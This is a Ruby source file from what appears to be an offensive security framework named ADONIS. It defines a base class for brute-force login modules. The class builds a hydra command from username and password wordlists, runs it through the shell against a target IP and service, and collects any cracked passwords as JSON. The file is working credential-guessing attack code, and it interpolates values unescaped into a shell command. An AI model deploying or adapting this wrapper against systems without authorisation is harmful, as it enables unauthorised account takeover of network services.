#encoding: utf-8

require 'thread'

module ADONIS
module EXPLOIT

class BruteFourceBase < Base

    def brute_fource_init module_id, service_name, port_str
        module_name = "#{service_name}_brute_fource_login"
        module_desc = "#{service_name}暴力破解"
        update_info(module_id, module_name, service_name, module_desc, port_str, false)
        set_default_cmd
    end

    def set_default_cmd
        @cmd = File.join(::ADONIS::BinDir, "hydra")
        @username_file = File.join(::ADONIS::DataDir, "local_wordlists/#{service}_user.txt")
        @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/#{service}_pwd.txt")
        unless File.exist?(@username_file)
            @username_file = File.join(::ADONIS::DataDir, "local_wordlists/default_user.txt")
        end
        unless File.exist?(@passwd_file)
            @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/default_pwd.txt")
        end
    end

    def exploit_fuc host
        ::ADONIS.exploit_logger.info("#{self.class}, exploit_func #{id}: #{host.ip}")
        command = "#{@cmd} -L #{@username_file} -P #{@passwd_file} #{@args} #{host.ip} #{service}"
        p command

        out = `#{command}`

        password_list = ::ADONIS::EXPLOIT::Hydra.check out
        
        if password_list.nil? 
            log_msg = out
            return false
        else
            log_msg = password_list.to_json
            return true
        end
    end

end

end
end

